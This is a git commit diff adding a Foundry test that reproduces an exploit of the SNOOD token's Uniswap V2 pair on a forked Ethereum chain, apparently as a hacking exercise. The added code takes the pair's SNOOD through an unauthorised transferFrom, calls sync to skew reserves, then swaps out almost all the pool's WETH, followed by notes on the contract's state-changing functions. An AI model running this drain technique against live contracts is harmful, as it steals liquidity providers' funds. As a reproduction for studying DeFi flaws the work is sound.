1532b4391542b166ab1f2ecad7e93e0e8965ecd6
Vasiliy Yorkin <vasiliy.yorkin@gmail.com>
2022-08-31 20:46:14 +0300

    Add the exploit code

--- test/SchnoodleHack.t.sol
+++ test/SchnoodleHack.t.sol
@@ -14,10 +14,43 @@ contract SchnoodleHack is Test {
     function testSchnoodleHack() public {
         vm.createSelectFork(vm.envString("ETH_RPC_URL"), 14983600);
         console.log("Your Starting WETH Balance:", weth.balanceOf(address(this)));
-        
+
         // INSERT EXPLOIT HERE
+
+        vm.label(address(uniswap), "UniswapV2");
+        vm.label(address(snood), "SNOOD");
+        vm.label(address(weth), "WETH");
+
+        uint256 amountSNOOD = snood.balanceOf(address(uniswap));
+        snood.transferFrom(address(uniswap), address(this), amountSNOOD - 1);
+        console.log("Got %d SNOOD", amountSNOOD / 1 ether);
+
+        // kick the pair
+        uniswap.sync();
+ 
+        (uint112 uniWETH, uint112 uniSNOOD,) = uniswap.getReserves();
+        console.log("UniswapV2 Pair: %d WETH, %d SNOOD", uniWETH / 1 ether, uniSNOOD / 1 ether);
+
+        snood.transfer(address(uniswap), amountSNOOD - 1);
+        uniswap.swap(uniWETH - 1, 0, address(this), "");
 
         console.log("Your Final WETH Balance:", weth.balanceOf(address(this)));
         assert(weth.balanceOf(address(this)) > 100 ether);
     }
 }
+
+// SchnoodleV9Base
+// External functions that change state: NO
+
+// SchnoodleV9
+// External functions that change state:
+//
+// - setTokens
+//   * calls burn(amount, "")
+//   * modifies _tokensSent
+// - payFee
+//   * modifies _feesPaid
+//   * transfers msg.value to _bridgeOwner 
+
+// ERC777?
+// transferFrom
